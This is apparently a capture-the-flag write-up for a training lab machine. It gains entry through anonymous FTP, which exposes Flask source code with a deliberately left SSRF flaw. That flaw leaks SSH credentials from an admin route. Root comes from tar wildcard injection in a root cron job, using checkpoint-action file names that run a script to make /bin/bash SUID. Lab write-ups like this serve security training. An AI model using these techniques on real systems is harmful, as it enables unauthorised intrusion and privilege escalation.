## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Volt Labs, a small SaaS shop, suspects an old staging server has rotted into an exposed liability. Mara has assigned you the engagement. Find your way in and demonstrate full compromise.

Start the VM by clicking the `Start Lab Machine` button at the top right of the task. You can complete the challenge by connecting through VPN or the AttackBox, which contains all the essential tools.

Allow two to three minutes for all services to start.
```
## IP-Address
```IP
10.48.156.126
```
----
## Enumeration
- Port-Scan
```bash
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 May 09 23:14 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.156.78
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4e:70:ad:6d:4a:64:88:fb:8e:48:ff:72:49:c5:d2:69 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBInDNL+XRdJrg1be3EensifZReweOH5run0pvH9WVC8ytXjZ2+yFXhq1gy5//gmjanzyOKOxfcuarhfPG+IRk5E=
|   256 3d:3d:bf:7b:ff:92:e8:29:0d:4b:84:75:07:5f:8a:31 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINCOKpsrsysFMj7MrDhArm432R4cbEtH/Oab7vzwot5b
80/tcp open  http    syn-ack ttl 62 Gunicorn
|_http-server-header: gunicorn
| http-methods:
|_  Supported Methods: GET OPTIONS HEAD
|_http-title: URL Preview - Volt Labs
```
----
#### FTP
```bash
$ ftp $TARGET
Connected to 10.48.156.126.
220 (vsFTPd 3.0.5)
Name (10.48.156.126:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40084|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 09 23:14 pub
ftp> cd pub
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||40019|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          2446 May 09 23:14 backup.tar.gz
226 Directory send OK.
ftp> get backup.tar.gz
local: backup.tar.gz remote: backup.tar.gz
229 Entering Extended Passive Mode (|||40079|)
150 Opening BINARY mode data connection for backup.tar.gz (2446 bytes).
100% |*****************************************************************************************************************************|  2446        3.98 MiB/s    00:00 ETA
226 Transfer complete.
2446 bytes received in 00:00 (81.16 KiB/s)
```
----
#### Backup.tar.gz
```bash
$ tar -xf backup.tar.gz
$ ls
backup.tar.gz  voltlabs-preview
$ cd voltlabs-preview
$ ls
app.py  README.md  requirements.txt
$ cat requirements.txt
flask
requests
gunicorn
$ cat README.md
# Volt Labs URL Preview
Internal staging tool. Run with `gunicorn -b 0.0.0.0:80 app:app`.
Admin routes are gated by source-IP check (localhost only).
```
- cat app.py
```python
from flask import Flask, request, abort
from urllib.parse import urlparse
import html
import requests

app = Flask(__name__)

# Only requests targeting an approved internal hostname are forwarded.
# Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.
ALLOWED_HOSTS = {"kestrel.thm"}

CSS = """
<style>
:root{--primary:#0d6efd;--bg:#f6f8fa;--card:#fff;--text:#212529;--muted:#6c757d;--border:#dee2e6}
*{box-sizing:border-box}
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;font-size:16px;line-height:1.5;color:var(--text);background:var(--bg)}
a{color:var(--primary);text-decoration:none}
a:hover{text-decoration:underline}
.navbar{background:#212529;color:#fff;padding:.75rem 1.5rem;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 3px rgba(0,0,0,.08)}
.navbar .brand{font-weight:600;font-size:1.125rem;letter-spacing:.2px}
.navbar .muted-light{color:#a5acb3;font-size:.95rem}
.container{max-width:960px;margin:2rem auto;padding:0 1rem}
.card{background:var(--card);border:1px solid var(--border);border-radius:.5rem;padding:1.5rem;margin-bottom:1.25rem;box-shadow:0 1px 2px rgba(0,0,0,.04)}
h1{font-size:1.75rem;margin:0 0 .75rem}
h2{font-size:1.25rem;margin:1.25rem 0 .5rem}
.muted{color:var(--muted);font-size:.95rem}
.form-group{margin-bottom:1rem}
label{display:block;margin-bottom:.25rem;font-weight:500;font-size:.95rem}
.form-control{display:block;width:100%;padding:.5rem .75rem;font-size:1rem;line-height:1.5;color:var(--text);background:#fff;border:1px solid var(--border);border-radius:.375rem;transition:border-color .15s,box-shadow .15s}
.form-control:focus{outline:0;border-color:#86b7fe;box-shadow:0 0 0 .2rem rgba(13,110,253,.25)}
.btn{display:inline-block;padding:.5rem 1rem;font-size:1rem;font-weight:500;border:1px solid transparent;border-radius:.375rem;cursor:pointer;transition:background .15s}
.btn-primary{background:var(--primary);color:#fff}
.btn-primary:hover{background:#0b5ed7}
pre{background:#f1f3f5;border:1px solid var(--border);border-radius:.375rem;padding:.75rem;overflow:auto;font-size:.9rem;white-space:pre-wrap;word-break:break-word}
footer.site{text-align:center;color:var(--muted);margin:2rem 0;font-size:.875rem}
</style>
"""

def page(title, body):
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{title} - Volt Labs</title>{CSS}</head>
<body>
<nav class="navbar">
    <span class="brand">Volt Labs</span>
    <span class="muted-light">URL Preview Service &middot; staging</span>
</nav>
<main class="container">{body}</main>
<footer class="site">&copy; Volt Labs &middot; do not expose externally</footer>
</body>
</html>"""

@app.route("/")
def index():
    body = """
    <div class="card">
        <h1>URL Preview Service</h1>
        <p class="muted">Internal tool. Paste a URL below to preview its contents.</p>
        <form method="get" action="/preview">
            <div class="form-group">
                <label for="url">URL</label>
                <input id="url" type="text" name="url" class="form-control" placeholder="https://example.com/" required>
            </div>
            <button type="submit" class="btn btn-primary">Preview</button>
        </form>
    </div>
    """
    return page("URL Preview", body)

@app.route("/preview")
def preview():
    target = request.args.get("url", "")
    if not target:
        return page("Preview Error",
                    '<div class="card"><p>Provide a <code>?url=</code> parameter.</p></div>'), 400

    # VULN: hostname allow-list is the only check. No scheme check, no path check,
    # no localhost-rebind protection - the SSRF is still abusable, but only
    # against the allowed hostname.
    host = (urlparse(target).hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        return page("Preview Blocked",
                    '<div class="card"><p>Host not in the approved internal allow-list.</p></div>'), 403

    try:
        r = requests.get(target, timeout=3)
        safe_target = html.escape(target)
        safe_body = r.text.replace("<", "&lt;")
        body = f"""
        <div class="card">
            <h2>Preview of {safe_target}</h2>
            <pre>{safe_body}</pre>
        </div>
        """
        return page("Preview", body)
    except Exception as e:
        safe_err = html.escape(str(e))
        return page("Preview Failed",
                    f'<div class="card"><p>Fetch failed: {safe_err}</p></div>'), 502

@app.route("/admin/")
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
    return "<pre>Volt Labs admin endpoint.</pre>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)

```
----
## Web 
- Port 80 Observation
```notes
- backup.tar.gz is the backend files of the code running over port 80 
- backend is set to word on localhost and provide info to the users fetching files directly from the local host including sensitive files also 
local host - 127.0.0.1:80 in host file mentioned as 
kestrel.thm
```
- In Search Bar fetch `[http://127.0.0.0](http://kestrel.thm/admin/notes)`
- Output
```bash
<pre>=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: [password omitted]
- Mara
</pre>
```
----
## SSH
```bash
ssh webdev@$TARGET
Password : [password omitted]
successful

webdev@coldstart:~$ ls
user.txt
webdev@coldstart:~$ cat user.txt
[flag omitted]
webdev@coldstart:/home$ id
uid=1001(webdev) gid=1001(webdev) groups=1001(webdev)
webdev@coldstart:/home$ whoami
webdev
webdev@coldstart:/opt/backups$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
webdev:x:1001:1001::/home/webdev:/bin/bash
```
----
#### Priv Escalation
- Run `./lse.sh`
```bash
Found 
/etc/cron.d/voltlabs-backup:* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```
- Enumerate More
```bash
$ cd /opt/backups/ 
$ ls 
$ ls -la 
total 12 
drwxrwx--- 2 webdev webdev 4096 May 9 23:14 . 
drwxr-xr-x 4 root root 4096 May 9 23:14 .. 
-rw-r--r-- 1 webdev webdev 12 May 9 23:14 .keep 
$ cat .keep 
placeholder 
$ cat /etc/passwd | grep sh$ 
root:x:0:0:root:/root:/bin/bash ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash webdev:x:1001:1001::/home/webdev:/bin/bash
```
- Observation
```Notes
- /opt/backup - owned by webdev and have full write control and in crontab 

cat /etc/cron.d/voltlabs-backup
# Volt Labs staging backup - runs as root
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *

this directory tar compress direcory and it compress by root and run everything inside the backup direcory 
```
- Exploitation
```bash
webdev@coldstart:/opt/backups$ tar --version
tar (GNU tar) 1.35
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by John Gilmore and Jay Fenlason.
webdev@coldstart:/opt/backups$ cd /opt/backups

cat > shell.sh << 'EOF'
#!/bin/sh
chmod u+s /bin/bash
EOF

chmod +x shell.sh
webdev@coldstart:/opt/backups$ touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
webdev@coldstart:/opt/backups$ ls -la
total 16
-rw-rw-r-- 1 webdev webdev    0 Jul  1 09:49 '--checkpoint-action=exec=sh shell.sh'
-rw-rw-r-- 1 webdev webdev    0 Jul  1 09:49 '--checkpoint=1'
drwxrwx--- 2 webdev webdev 4096 Jul  1 09:49  .
drwxr-xr-x 4 root   root   4096 May  9 23:14  ..
-rw-r--r-- 1 webdev webdev   12 May  9 23:14  .keep
-rwxrwxr-x 1 webdev webdev   30 Jul  1 09:49  shell.sh
webdev@coldstart:/opt/backups$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
webdev@coldstart:/opt/backups$ /bin/bash -p
id
bash-5.2# id
uid=1001(webdev) gid=1001(webdev) euid=0(root) groups=1001(webdev)
bash-5.2# cd /root
bash-5.2# ls
flag.txt  snap
bash-5.2# cat flag.txt
[flag omitted]
```
# END